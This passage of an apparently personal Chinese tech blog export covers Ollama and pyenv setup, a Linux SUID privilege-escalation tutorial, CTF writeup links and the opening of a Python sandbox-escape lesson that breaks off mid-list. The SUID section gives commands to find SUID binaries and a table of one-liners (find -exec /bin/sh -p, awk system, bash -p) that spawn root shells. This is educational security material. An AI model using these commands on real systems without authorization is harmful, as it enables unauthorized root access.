<p>只填写端口号可以同时侦听（所有） IPv4 和 IPv6 的:8000 端口。还需在Windows防火墙中开启远程访问。</p>
<h3 id="允许浏览器跨域请求（可选）">允许浏览器跨域请求（可选）</h3>
<p>Ollama 默认只允许来自127.0.0.1和0.0.0.0的跨域请求，如果你计划在其它前端面板中调用 Ollama API，比如Open WebUI，建议放开跨域限制：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">变量名：OLLAMA_ORIGINS</span><br><span class="line">变量值：*</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>环境配置</category>
      </categories>
  </entry>
  <entry>
    <title>Python版本管理器pyenv的安装与使用</title>
    <url>//post/pyenv/</url>
    <content><![CDATA[<p><strong>pyenv</strong> 是一个用于管理多个 Python 版本的工具。它允许你在同一台机器上安装、切换和管理不同的 Python 版本，而不需要依赖系统级的 Python 安装。</p>
<p>GitHub主页：</p>
<p><a class="link"   href="https://github.com/pyenv/pyenv" >pyenv/pyenv: Simple Python version management (github.com)<i class="fas fa-external-link-alt"></i></a></p>
<p><a class="link"   href="https://github.com/pyenv-win/pyenv-win" >pyenv-win/pyenv-win: pyenv for Windows<i class="fas fa-external-link-alt"></i></a></p>
<h3 id="安装pyenv">安装pyenv</h3>
<h4 id="Ubuntu">Ubuntu</h4>
<ul>
<li>
<p>依赖安装</p>
<p>pyenv需要编译安装python，所以需要安装相关库</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt update</span><br><span class="line"><span class="built_in">sudo</span> apt install git curl build-essential libssl-dev zlib1g-dev libbz2-dev \</span><br><span class="line">libreadline-dev libsqlite3-dev wget llvm libncurses5-dev libncursesw5-dev \</span><br><span class="line">xz-utils tk-dev libffi-dev liblzma-dev python3-openssl git</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>自动安装脚本</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl https://pyenv.run | bash</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>添加环境变量到<code>.bashrc</code>或<code>.zshrc</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">export</span> PYENV_ROOT=<span class="string">&quot;<span class="variable">$HOME</span>/.pyenv&quot;</span></span><br><span class="line">[[ -d <span class="variable">$PYENV_ROOT</span>/bin ]] &amp;&amp; <span class="built_in">export</span> PATH=<span class="string">&quot;<span class="variable">$PYENV_ROOT</span>/bin:<span class="variable">$PATH</span>&quot;</span></span><br><span class="line"><span class="built_in">eval</span> <span class="string">&quot;<span class="subst">$(pyenv init -)</span>&quot;</span></span><br></pre></td></tr></table></figure>
</li>
</ul>
<h4 id="Windows">Windows</h4>
<ul>
<li>
<p>自动安装脚本</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Invoke-WebRequest</span> <span class="literal">-UseBasicParsing</span> <span class="literal">-Uri</span> <span class="string">&quot;https://raw.githubusercontent.com/pyenv-win/pyenv-win/master/pyenv-win/install-pyenv-win.ps1&quot;</span> <span class="literal">-OutFile</span> <span class="string">&quot;./install-pyenv-win.ps1&quot;</span>; &amp;<span class="string">&quot;./install-pyenv-win.ps1&quot;</span></span><br></pre></td></tr></table></figure>
</li>
</ul>
<h4 id="macOS">macOS</h4>
<ul>
<li>
<p>homebrew</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">brew install xz     <span class="comment">#现在macOS好像没有自带xz，在编译python时可能会出错，所以要提前安装</span></span><br><span class="line">brew install pyenv</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h3 id="使用pyenv">使用pyenv</h3>
<h4 id="安装-Python-版本">安装 Python 版本</h4>
<p>使用 <code>pyenv</code> 可以安装任意支持的 Python 版本：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pyenv install 3.8.12</span><br><span class="line">pyenv install 3.9.7</span><br><span class="line">pyenv install 3.10.0</span><br></pre></td></tr></table></figure>
<p>你可以使用 <code>pyenv install --list</code> 查看所有可用的 Python 版本。</p>
<h4 id="切换-Python-版本">切换 Python 版本</h4>
<p><code>pyenv</code> 支持全局和局部（本地）切换 Python 版本。</p>
<ul>
<li>
<p><strong>全局切换</strong>（影响所有项目）：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pyenv global 3.9.7</span><br></pre></td></tr></table></figure>
<p>在Linux下可以多版本共存，例如<code>pyenv global 3.9.13 2.7.18</code>，即可实现两个版本同时存在，在Windows下好像不行，有待研究</p>
</li>
<li>
<p><strong>局部切换</strong>（仅影响当前目录或项目）：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pyenv <span class="built_in">local</span> 3.8.12</span><br></pre></td></tr></table></figure>
</li>
<li>
<p><strong>查看当前 Python 版本</strong>：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pyenv version</span><br></pre></td></tr></table></figure>
</li>
<li>
<p><strong>查看所有安装的 Python 版本</strong>：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pyenv versions</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h4 id="卸载-Python-版本">卸载 Python 版本</h4>
<p>如果你不再需要某个 Python 版本，可以使用以下命令卸载它：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pyenv uninstall 3.8.12</span><br></pre></td></tr></table></figure>
<h3 id="软链接">软链接</h3>
<p>如果输入python3可以正常进入，输入python则不行，需要设置软链接，则可以把python3.9链接到python</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> <span class="built_in">ln</span> -s /usr/bin/python3.9  /usr/bin/python</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>环境配置</category>
      </categories>
  </entry>
  <entry>
    <title>浅析Linux SUID提权</title>
    <url>//post/suidtq/</url>
    <content><![CDATA[<h3 id="什么是SUID">什么是SUID</h3>
<p>SUID（Set User ID）是文件权限的一种特殊位，表示当一个可执行文件被执行时，它会以文件拥有者的权限运行，而不是以执行者的权限运行。 也就是说，<strong>如果该程序有SUID权限，程序运行进程的属主不是发起者，而是程序文件所属的属主。</strong></p>
<p>Linux 系统中引入了三个主要文件来管理用户和用户组的信息：</p>
<ul>
<li>
<p><strong><code>/etc/passwd</code></strong>：</p>
<ul>
<li>存储用户的基本信息，例如用户名、用户ID（UID）、组ID（GID）等。</li>
<li>每个用户对应一行信息。</li>
</ul>
<p><code>/etc/passwd</code> 文件中，每一行表示一个用户的信息，包含7个字段，用冒号（<code>:</code>）分隔。具体字段含义如下：</p>
<table>
<thead>
<tr>
<th>编号</th>
<th>字段名</th>
<th>含义</th>
</tr>
</thead>
<tbody>
<tr>
<td><strong>1</strong></td>
<td>用户名（login name）</td>
<td>用户的登录名，用于标识用户，必须是唯一的，如<code>root</code>、<code>user1</code>等。</td>
</tr>
<tr>
<td><strong>2</strong></td>
<td>密码占位符</td>
<td>传统上存储加密密码，但现在存储的是占位符<code>x</code>，实际密码存储在<code>/etc/shadow</code>中。</td>
</tr>
<tr>
<td><strong>3</strong></td>
<td>用户ID（UID）</td>
<td>每个用户都有一个唯一的用户ID，用于标识用户。例如<code>0</code>表示超级用户<code>root</code>，普通用户的UID一般从1000开始。</td>
</tr>
<tr>
<td><strong>4</strong></td>
<td>组ID（GID）</td>
<td>用户所属组的ID，用于标识用户的主组。主组的详细信息存储在<code>/etc/group</code>中。</td>
</tr>
<tr>
<td><strong>5</strong></td>
<td>备注信息</td>
<td>说明或备注字段，通常存放用户的全名或其他信息，可以为空。</td>
</tr>
<tr>
<td><strong>6</strong></td>
<td>用户主目录</td>
<td>用户的默认主目录，通常是<code>/home/用户名</code>，也可以指定其他目录。</td>
</tr>
<tr>
<td><strong>7</strong></td>
<td>登录Shell</td>
<td>用户登录时的默认Shell。例如<code>/bin/bash</code>（可登录），或<code>/sbin/nologin</code>（不允许登录）。</td>
</tr>
</tbody>
</table>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20241127210337810.png"
                        alt="image-20241127210337810"
                 ></p>
</li>
<li>
<p><strong><code>/etc/shadow</code></strong>：</p>
<ul>
<li>专门存储用户的密码信息（加密后的密码）。</li>
<li>只有root用户或具有足够权限的用户可以访问这个文件。</li>
</ul>
</li>
<li>
<p><strong><code>/etc/group</code></strong>：</p>
<ul>
<li>存储系统中所有组的信息，例如组名、组ID（GID）以及组内的成员。</li>
</ul>
</li>
</ul>
<h3 id="利用SUID提权的原理">利用SUID提权的原理</h3>
<p>如果一个文件的属主是 <strong>root</strong> 且设置了 <strong>SUID</strong>，即使是普通用户执行该文件，程序运行时也会以 <strong>root</strong> 权限执行；系统中的用户如果 <strong>UID=0</strong>，将被视为 <strong>root</strong> 用户。因此，若普通用户的 UID 被设为 0，登录后将自动拥有 <strong>root</strong> 权限。利用此特性，就可通过SUID进行提权。</p>
<h3 id="如何设置SUID">如何设置SUID</h3>
<h3 id="设置-SUID-权限">设置 SUID 权限</h3>
<ul>
<li>
<p><strong>查看文件当前权限：</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">ls</span> -l filename</span><br></pre></td></tr></table></figure>
<p>输出的权限中，没有 <code>s</code> 则表示尚未设置 SUID。</p>
</li>
<li>
<p><strong>设置 SUID：</strong> 使用 <code>chmod</code> 命令给文件设置 SUID 位：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">chmod</span> u+s filename</span><br></pre></td></tr></table></figure>
<ul>
<li><code>u+s</code> 表示给文件所有者（user）增加 SUID 权限。</li>
</ul>
</li>
<li>
<p><strong>确认设置结果：</strong> 再次查看文件权限：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">ls</span> -al filename</span><br></pre></td></tr></table></figure>
<p>如果文件权限中显示类似 <code>-rwsr-xr-x</code>（注意 <code>s</code>），说明 SUID 设置成功。</p>
</li>
</ul>
<h3 id="如何查找已有SUID的文件">如何查找已有SUID的文件</h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">find / -user root -perm -4000 -<span class="built_in">print</span> 2&gt;/dev/null</span><br><span class="line">find / -perm -4000 -<span class="built_in">type</span> f 2&gt;/dev/null</span><br><span class="line">find / -perm -u=s -<span class="built_in">type</span> f 2&gt;/dev/null</span><br><span class="line">find / -user root -perm -4000 -<span class="built_in">exec</span> <span class="built_in">ls</span> -ldb &#123;&#125; \;</span><br><span class="line"></span><br><span class="line"><span class="comment">#find / -perm -u=s -type f 2&gt;/dev/null</span></span><br><span class="line"><span class="comment">#/表示从文件系统的顶部（根）开始并找到每个目录</span></span><br><span class="line"><span class="comment">#-perm 表示搜索随后的权限</span></span><br><span class="line"><span class="comment">#-u = s表示查找root用户拥有的文件</span></span><br><span class="line"><span class="comment">#-4000：查找 SUID 文件（权限位的 SUID 为 4）</span></span><br><span class="line"><span class="comment">#-type表示我们正在寻找的文件类型</span></span><br><span class="line"><span class="comment">#f 表示常规文件，而不是目录或特殊文件</span></span><br><span class="line"><span class="comment">#2表示该进程的第二个文件描述符，即stderr（标准错误）</span></span><br><span class="line"><span class="comment">#&gt;表示重定向</span></span><br><span class="line"><span class="comment">#/dev/null是一个特殊的文件系统对象，它将丢弃写入其中的所有内容。</span></span><br></pre></td></tr></table></figure>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20241127212535096.png"
                        alt="image-20241127212535096"
                 ></p>
<h3 id="进行SUID提权">进行SUID提权</h3>
<p>前提：所使用的命令必须有SUID权限</p>
<h4 id="find命令提权">find命令提权</h4>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#先前利用以上查找suid文件查询到了/usr/bin/find 有suid权限</span></span><br><span class="line"></span><br><span class="line">find 任意文件 -<span class="built_in">exec</span> <span class="built_in">whoami</span> \; -quit</span><br><span class="line"><span class="comment">#root</span></span><br><span class="line">find 任意文件 -<span class="built_in">exec</span> /bin/sh -p \; -quit</span><br><span class="line"><span class="comment">#whoami</span></span><br><span class="line"><span class="comment">#root</span></span><br><span class="line"><span class="built_in">touch</span> 1.txt <span class="comment">#创建1.txt</span></span><br><span class="line">/usr/bin/find 1.txt -<span class="built_in">exec</span> <span class="built_in">whoami</span> \;</span><br></pre></td></tr></table></figure>
<h4 id="其他命令提权">其他命令提权</h4>
<table>
<thead>
<tr>
<th style="text-align:left">suid文件</th>
<th style="text-align:left">提权命令</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">/usr/bin/bash</td>
<td style="text-align:left">bash -p</td>
</tr>
<tr>
<td style="text-align:left">/usr/bin/csh</td>
<td style="text-align:left">csh -b</td>
</tr>
<tr>
<td style="text-align:left">/usr/bin/sh</td>
<td style="text-align:left">sh -p</td>
</tr>
<tr>
<td style="text-align:left">/usr/bin/ksh</td>
<td style="text-align:left">ksh -p</td>
</tr>
<tr>
<td style="text-align:left">/usr/bin/zsh</td>
<td style="text-align:left">zsh</td>
</tr>
<tr>
<td style="text-align:left">/usr/bin/find</td>
<td style="text-align:left">find /etc/passwd -exec /bin/bash -p ;</td>
</tr>
<tr>
<td style="text-align:left">/usr/bin/awk</td>
<td style="text-align:left">awk ‘BEGIN {system(“/bin/bash”)}’</td>
</tr>
<tr>
<td style="text-align:left">/usr/bin/man</td>
<td style="text-align:left">!/bin/bash</td>
</tr>
<tr>
<td style="text-align:left">/usr/bin/more</td>
<td style="text-align:left">!/bin/bash</td>
</tr>
</tbody>
</table>
<p>可以查阅：<a class="link"   href="https://gtfobins.github.io/" >https://gtfobins.github.io/<i class="fas fa-external-link-alt"></i></a></p>
<p>离线版：<a class="link"   href="https://github.com/nccgroup/GTFOBLookup" >https://github.com/nccgroup/GTFOBLookup<i class="fas fa-external-link-alt"></i></a></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gtfoblookup gtfobins search find</span><br><span class="line"><span class="comment">#在gtfobins库中查找find命令</span></span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>学习记录</category>
      </categories>
      <tags>
        <tag>Web</tag>
      </tags>
  </entry>
  <entry>
    <title>2024 楚彗杯 超级WriteUp</title>
    <url>//post/sbchb666/</url>
    <content><![CDATA[<p><a class="link"   href="https://blog.jacki.cn/2024/11/29/%E5%A4%A9%E5%B1%B1%E5%9B%BA%E7%BD%91/#CRYPTO-ddd" >2024 天山固网杯决赛 部分WP - m0h31h31<i class="fas fa-external-link-alt"></i></a></p>
<p><a class="link"   href="https://dexterjie.github.io/2024/12/01/%E8%B5%9B%E9%A2%98%E5%A4%8D%E7%8E%B0/2024%E7%AC%AC%E4%BA%8C%E5%B1%8A%E7%A6%8F%E5%BB%BA%E7%9C%81%E6%95%B0%E6%8D%AE%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B/" >2024第二届福建省数据安全大赛<i class="fas fa-external-link-alt"></i></a></p>
<p><a class="link"   href="https://blog.jacki.cn/2024/11/29/%E5%A4%A9%E5%B1%B1%E5%9B%BA%E7%BD%91/#REVERSE-bouquet" >天山固网<i class="fas fa-external-link-alt"></i></a></p>
<p><a class="link"   href="https://blog.csdn.net/luochen2436/article/details/132964576" >2023黑龙江省赛<i class="fas fa-external-link-alt"></i></a></p>
<p><a class="link"   href="https://blog.csdn.net/luochen2436/article/details/132138412" >CTF Crypto — 七八月份比赛杂题记录_ctf替换了部分模型权重-CSDN博客<i class="fas fa-external-link-alt"></i></a></p>
<p><a class="link"   href="https://dexterjie.github.io/2023/09/17/%E8%B5%9B%E9%A2%98%E5%A4%8D%E7%8E%B0/%E9%BB%91%E9%BE%99%E6%B1%9F%E7%9C%81%E8%B5%9B/#%E5%86%B3%E8%B5%9B" >黑龙江省赛 | DexterJie’Blog<i class="fas fa-external-link-alt"></i></a></p>
<p><a class="link"   href="https://blog.csdn.net/qq_42880719/article/details/126175056" >蓝帽杯2022年半决赛 writeup(附取证题目+解压密码+附件)_2022蓝帽杯半决赛-CSDN博客<i class="fas fa-external-link-alt"></i></a></p>
<p><a class="link"   href="https://hwlanxiaojun.github.io/2020/04/25/%E5%AE%89%E6%81%92%E6%9D%AF%E5%9B%9B%E6%9C%88%E6%9C%88%E8%B5%9B%E9%A2%98%E8%A7%A3/#0x-04-awdshell" >安恒杯四月月赛题解<i class="fas fa-external-link-alt"></i></a></p>
<p><a class="link"   href="http://www.andynoel.xyz/?p=416" >2022 BluehatCup Semi-Finals | Partly Writeup – AndyNoel’s Blog<i class="fas fa-external-link-alt"></i></a></p>
<p><a class="link"   href="https://c-lby.top/2024/2024YLCTF-1/" >『YLCTF 源鲁杯 2024』 PWN-1 WP | C_LBY’s BLOG<i class="fas fa-external-link-alt"></i></a></p>
<p><a class="link"   href="https://mp.weixin.qq.com/s/me3pY_xa2RIHOncin9B5QA" >2024年福建省大学生数据安全大赛-技能实践赛决赛<i class="fas fa-external-link-alt"></i></a></p>
<p><a class="link"   href="https://www.lo-ve.cn/index.php/archives/65/" >2024第二届福建省数据安全大赛-浅兮<i class="fas fa-external-link-alt"></i></a></p>
]]></content>
      <categories>
        <category>题解</category>
      </categories>
  </entry>
  <entry>
    <title>Python沙盒逃逸深度学习</title>
    <url>//post/pyjail/</url>
    <content><![CDATA[<p>参考链接：</p>
<ul>
<li><a class="link"   href="https://blog.csdn.net/Jayjay___/article/details/132436072" >https://blog.csdn.net/Jayjay___/article/details/132436072<i class="fas fa-external-link-alt"></i></a></li>
<li><a class="link"   href="https://ch3mtr4ils.cn/2024/07/27/Python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/#HNCTF2022-pyjail" >Python沙箱逃逸 | Chemtrails<i class="fas fa-external-link-alt"></i></a></li>
</ul>
<p>特别鸣谢：<a class="link"   href="https://void2eye.fun/" >void2eye<i class="fas fa-external-link-alt"></i></a></p>
<h3 id="什么是Pyjail">什么是Pyjail</h3>
<p>Python沙箱逃逸是CTF题目中比较常见的类型，是指在受限环境中（通常称为“沙箱”）执行Python代码时，通过某种手段绕过安全限制，访问或修改不应被访问的资源或执行不应被执行的操作的过程，<strong>最终目标是执行系统任意命令，或读写文件。</strong></p>
<h3 id="Pyjail的实现原理">Pyjail的实现原理</h3>
<p>Python有一些特性，例如：Python的类均继承自<code>object</code>基类，Python的类中有一些静态方法，如<code>bytes.fromhex</code>、<code>int.frombytes</code>等，对于这些类的实例可以直接调用这些方法</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">b&#x27;1&#x27;</span>.fromhex(<span class="string">&#x27;1234&#x27;</span>) </span><br><span class="line"><span class="comment"># b&#x27;\x124&#x27;</span></span><br></pre></td></tr></table></figure>
<blockquote>
<p>特例：整数参数不支持这种操作，如<code>1.frombytes(b'\x124')</code>会报错。</p>
</blockquote>
<p>Python的类中具有一系列的魔术方法，其机制类似于PHP的魔术方法。例如对象<code>a</code>使用<code>a+b</code>时，其实是尝试调用了<code>a.__add__(b)</code>、</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">A</span>:</span><br><span class="line">    a = <span class="number">50</span></span><br><span class="line">    b = <span class="number">60</span></span><br><span class="line">    c = <span class="number">70</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(A.__dict__)</span><br><span class="line"></span><br><span class="line"><span class="comment"># &#123;&#x27;__module__&#x27;: &#x27;__main__&#x27;, &#x27;a&#x27;: 50, &#x27;b&#x27;: 60, &#x27;c&#x27;: 70, &#x27;__dict__&#x27;: &lt;attribute &#x27;__dict__&#x27; of &#x27;A&#x27; objects&gt;, &#x27;__weakref__&#x27;: &lt;attribute &#x27;__weakref__&#x27; of &#x27;A&#x27; objects&gt;, &#x27;__doc__&#x27;: None&#125;</span></span><br></pre></td></tr></table></figure>
<h3 id="Python魔术方法">Python魔术方法</h3>
<ol>
<li>
<p><strong><code>__init__</code></strong>：对象初始化方法，在创建对象时调用。通常用来初始化对象的属性。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">class Example:</span><br><span class="line">    def __init__(self, value):</span><br><span class="line">        self.value = value</span><br></pre></td></tr></table></figure>
</li>
<li>
<p><strong><code>__repr__</code></strong>：返回对象的“官方”字符串表示形式。通常可以通过调用 <code>repr(object)</code> 来查看。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">class Example:</span><br><span class="line">    def __repr__(self):</span><br><span class="line">        return f&quot;Example(value=&#123;self.value&#125;)&quot;</span><br></pre></td></tr></table></figure>
</li>
<li>
<p><strong><code>__str__</code></strong>：返回对象的“非正式”或友好字符串表示形式。通常可以通过调用 <code>str(object)</code> 或 <code>print(object)</code> 来查看。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">class Example:</span><br><span class="line">    def __str__(self):</span><br><span class="line">        return f&quot;Example with value &#123;self.value&#125;&quot;</span><br></pre></td></tr></table></figure>
</li>
<li>
<p><strong><code>__len__</code></strong>：返回对象的长度。常用于实现自定义容器类。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">class Container:</span><br><span class="line">    def __len__(self):</span><br><span class="line">        return len(self.items)</span><br></pre></td></tr></table></figure>
</li>
<li>
<p><strong><code>__getitem__</code></strong>：获取对象中指定键的值。通常用于实现自定义的索引操作。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">class Container:</span><br><span class="line">    def __getitem__(self, key):</span><br><span class="line">        return self.items[key]</span><br></pre></td></tr></table></figure>
</li>
<li>
<p><strong><code>__setitem__</code></strong>：设置对象中指定键的值。常用于实现可变容器。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">class Container:</span><br><span class="line">    def __setitem__(self, key, value):</span><br><span class="line">        self.items[key] = value</span><br></pre></td></tr></table></figure>
</li>
<li>
<p><strong><code>__delitem__</code></strong>：删除对象中指定键的值。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">class Container:</span><br><span class="line">    def __delitem__(self, key):</span><br><span class="line">        del self.items[key]</span><br></pre></td></tr></table></figure>
</li>
<li>
<p><strong><code>__iter__</code></strong>：返回一个迭代器对象。通常用于实现可迭代对象。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">class Container:</span><br><span class="line">    def __iter__(self):</span><br><span class="line">        return iter(self.items)</span><br></pre></td></tr></table></figure>
</li>
<li>
<p><strong><code>__contains__</code></strong>：检查对象是否包含指定的元素。通常用于 <code>in</code> 操作符。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">class Container:</span><br><span class="line">    def __contains__(self, item):</span><br><span class="line">        return item in self.items</span><br></pre></td></tr></table></figure>
</li>
<li>
<p><strong><code>__call__</code></strong>：使实例对象可以像函数一样被调用。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">class Example:</span><br><span class="line">    def __call__(self, value):</span><br><span class="line">        self.value = value</span><br></pre></td></tr></table></figure>
</li>
<li>
<p><strong><code>__base__</code></strong>：返回当前类的基类。如 <code>SomeClass.__base__</code> 会返回 <code>&lt;class 'object'&gt;</code>。</p>
</li>
<li>
<p><strong><code>__subclasses__()</code></strong>：查看当前类的子类组成的列表。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Example.__subclasses__()</span><br></pre></td></tr></table></figure>
</li>
<li>
<p><strong><code>__builtins__</code></strong>：以一个集合的形式查看其引用。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import builtins</span><br><span class="line">dir(builtins)</span><br></pre></td></tr></table></figure>
</li>
<li>
<p><strong><code>__getattr__</code></strong>、<strong><code>__setattr__</code></strong>、<strong><code>__delattr__</code></strong>：处理对象属性的获取、设置和删除。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">class Example:</span><br><span class="line">    def __getattr__(self, name):</span><br><span class="line">        return f&quot;&#123;name&#125; not found&quot;</span><br><span class="line"></span><br><span class="line">    def __setattr__(self, name, value):</span><br><span class="line">        self.__dict__[name] = value</span><br><span class="line"></span><br><span class="line">    def __delattr__(self, name):</span><br><span class="line">        del self.__dict__[name]</span><br></pre></td></tr></table></figure>
</li>
<li>
<p><strong><code>__enter__</code></strong>、<strong><code>__exit__</code></strong>：定义在使用 <code>with</code> 语句时对象的上下文管理行为。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">class Example:</span><br><span class="line">    def __enter__(self):</span><br><span class="line">        # Setup code</span><br><span class="line">        return self</span><br><span class="line"></span><br><span class="line">    def __exit__(self, exc_type, exc_val, exc_tb):</span><br><span class="line">        # Teardown code</span><br><span class="line">        pass</span><br></pre></td></tr></table></figure>
</li>
<li>
<p><strong><code>__class__</code></strong>：指向对象的类。可以用来获取对象的类信息。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">obj = Example()</span><br><span class="line">print(obj.__class__)  # &lt;class &#x27;__main__.Example&#x27;&gt;</span><br></pre></td></tr></table></figure>
</li>
<li>
<p><strong><code>__delattr__</code></strong>：当试图删除对象的属性时调用。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">class Example:</span><br><span class="line">    def __delattr__(self, name):</span><br><span class="line">        print(f&quot;Deleting attribute &#123;name&#125;&quot;)</span><br><span class="line">        super().__delattr__(name)</span><br></pre></td></tr></table></figure>
</li>
<li>
<p><strong><code>__dict__</code></strong>：包含对象（但不包括从类继承的属性）的属性字典。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">obj = Example()</span><br><span class="line">print(obj.__dict__)  # &#123;&#x27;attribute&#x27;: value&#125;</span><br></pre></td></tr></table></figure>
</li>
<li>
<p><strong><code>__dir__</code></strong>：由 <code>dir()</code> 函数调用，用于列出对象的属性和方法。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">class Example:</span><br><span class="line">    def __dir__(self):</span><br><span class="line">        return [&#x27;custom_attribute&#x27;, &#x27;another_attribute&#x27;]</span><br></pre></td></tr></table></figure>
</li>
<li>
<p><strong><code>__doc__</code></strong>：类或方法的文档字符串。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">class Example:</span><br><span class="line">    &quot;&quot;&quot;This is a docstring.&quot;&quot;&quot;</span><br><span class="line">print(Example.__doc__)  # &quot;This is a docstring.&quot;</span><br></pre></td></tr></table></figure>
</li>
<li>
<p><strong><code>__eq__</code></strong>：实现对象的相等性比较，通常由 <code>==</code> 操作符调用。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">class Example:</span><br><span class="line">    def __eq__(self, other):</span><br><span class="line">        return self.value == other.value</span><br></pre></td></tr></table></figure>
</li>
<li>
<p><strong><code>__format__</code></strong>：用于实现自定义的字符串格式化。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">class Example:</span><br><span class="line">    def __format__(self, format_spec):</span><br><span class="line">        return f&quot;Formatted value: &#123;self.value:&#123;format_spec&#125;&#125;&quot;</span><br></pre></td></tr></table></figure>
</li>
<li>
<p><strong><code>__ge__</code></strong>：实现对象的“大于等于”比较，通常由 <code>&gt;=</code> 操作符调用。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">class Example:</span><br><span class="line">    def __ge__(self, other):</span><br><span class="line">        return self.value &gt;= other.value</span><br></pre></td></tr></table></figure>
</li>
<li>
<p><strong><code>__getattribute__</code></strong>：在访问对象属性时调用，优先于 <code>__getattr__</code>。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">class Example:</span><br><span class="line">    def __getattribute__(self, name):</span><br><span class="line">        print(f&quot;Accessing attribute &#123;name&#125;&quot;)</span><br><span class="line">        return super().__getattribute__(name)</span><br></pre></td></tr></table></figure>
</li>
<li>
<p><strong><code>__getstate__</code></strong>：用于对象序列化时返回要保存的状态。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">class Example:</span><br><span class="line">    def __getstate__(self):</span><br><span class="line">        state = self.__dict__.copy()</span><br><span class="line">        return state</span><br></pre></td></tr></table></figure>
</li>
<li>
<p><strong><code>__gt__</code></strong>：实现对象的“大于”比较，通常由 <code>&gt;</code> 操作符调用。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">class Example:</span><br><span class="line">    def __gt__(self, other):</span><br><span class="line">        return self.value &gt; other.value</span><br></pre></td></tr></table></figure>
</li>
<li>
<p><strong><code>__hash__</code></strong>：实现对象的哈希值计算，通常由 <code>hash()</code> 函数调用。对象的哈希值应保持不变。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">class Example:</span><br><span class="line">    def __hash__(self):</span><br><span class="line">        return hash(self.value)</span><br></pre></td></tr></table></figure>
</li>
<li>
<p><strong><code>__init_subclass__</code></strong>：在子类化时调用，可以用来自定义子类的行为。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">class Base:</span><br><span class="line">    def __init_subclass__(cls, **kwargs):</span><br><span class="line">        super().__init_subclass__(**kwargs)</span><br><span class="line">        cls.custom_attribute = True</span><br></pre></td></tr></table></figure>
</li>
<li>
<p><strong><code>__le__</code></strong>：实现对象的“小于等于”比较，通常由 <code>&lt;=</code> 操作符调用。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">class Example:</span><br><span class="line">    def __le__(self, other):</span><br><span class="line">        return self.value &lt;= other.value</span><br></pre></td></tr></table></figure>
</li>
<li>
<p><strong><code>__lt__</code></strong>：实现对象的“小于”比较，通常由 <code>&lt;</code> 操作符调用。</p>
